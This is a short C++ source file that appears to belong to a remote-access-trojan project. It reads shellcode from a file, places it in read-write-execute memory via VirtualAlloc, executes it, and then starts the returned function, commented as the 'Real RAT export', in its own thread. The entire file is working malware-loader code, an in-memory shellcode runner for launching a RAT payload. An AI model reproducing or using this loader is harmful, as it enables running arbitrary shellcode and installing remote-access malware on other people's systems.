#include "shellcode.hpp"
#include <algorithm>
#include <filesystem>
#include <fstream>
#include <vector>

std::vector<std::byte> read_file(const std::filesystem::path& path) {
    std::basic_ifstream<std::byte> file{ path, std::ios::binary };

    // ~basic_ifstream() closes the file handle
    return std::vector<std::byte>{
        std::istreambuf_iterator<std::byte>{file},
        std::istreambuf_iterator<std::byte>()
    };
}

int wmain(int argc, wchar_t* argv[]) {
    std::filesystem::path path;

    if (argc < 2) {
        path = std::filesystem::absolute(SHELLCODE_PATH);
    }
    else {
        path = std::filesystem::absolute(argv[1]);
    }

    auto bytes = read_file(path);

    void* rwx = VirtualAlloc(
        nullptr,
        bytes.size(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!rwx) {
        return EXIT_FAILURE;
    }

    std::copy_n(
        bytes.data(),
        bytes.size(),
        static_cast<std::byte*>(rwx)
    );

    auto result = reinterpret_cast<shellcode_t>(rwx)();
    VirtualFree(rwx, 0, MEM_RELEASE);
    if (error::SUCCESS != result.err) {
        return static_cast<int>(result.err);
    }

    // Real RAT export needs to be run in its own thread.
    HANDLE thread = CreateThread(
        nullptr,
        0,
        reinterpret_cast<PTHREAD_START_ROUTINE>(result.func),
        nullptr,
        0,
        nullptr
    );

    WaitForSingleObject(thread, INFINITE);

    return EXIT_SUCCESS;
}
